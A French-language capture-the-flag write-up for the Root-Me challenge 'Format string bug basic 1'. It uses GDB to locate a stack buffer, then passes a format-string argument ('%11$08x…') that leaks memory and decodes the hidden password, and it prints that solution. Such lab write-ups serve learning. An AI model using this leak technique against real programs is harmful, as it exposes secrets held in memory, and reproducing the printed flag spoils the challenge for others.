# [ELF x86 - Format string bug basic 1](https://www.root-me.org/fr/Challenges/App-Systeme/ELF-x86-Format-string-bug-basic-1)

L'objectif de ce challenge est d'exploiter une vulnérabilité de type _format string_ dans le programme pour récupérer le mot de passe stocké dans le fichier `.passwd`.

## Localisation de l'adresse du buffer

On analyse le binaire avec GDB.

```bash
gdb ./ch5
```

On désassemble la fonction `main` pour identifier l'adresse du buffer.

```
(gdb) disassemble main
Dump of assembler code for function main:
...
   0x08048575 <+79>:    pushl  -0x30(%ebp)
   0x08048578 <+82>:    push   $0x20
   0x0804857a <+84>:    lea    -0x2c(%ebp),%eax
   0x0804857d <+87>:    push   %eax
   0x0804857e <+88>:    call   0x80483b0 <fgets@plt>
...
End of assembler dump.
```

On observe que le buffer utilisé pour stocker le contenu de `.passwd` est localisé à `-0x2c(%ebp)`.

## Exploitation de la vulnérabilité

Sachant que le buffer est à `-0x2c(%ebp)`, le contenu du buffer est accessible à partir du 11ème paramètre (0x2c = 44). On peut donc exploiter la vulnérabilité en affichant les valeurs hexadécimales des 4 premiers mots à partir du 11e paramètre :

```bash
./ch5 '%11$08x %12$08x %13$08x %14$08x'
```

En exécutant la commande, on obtient les valeurs suivantes :

```
39617044 28293664 6d617045 bf000a64
```

En convertissant les valeurs hexadécimales en ASCII, on obtient le mot de passe : `Dpa9d6)(Epamd`.
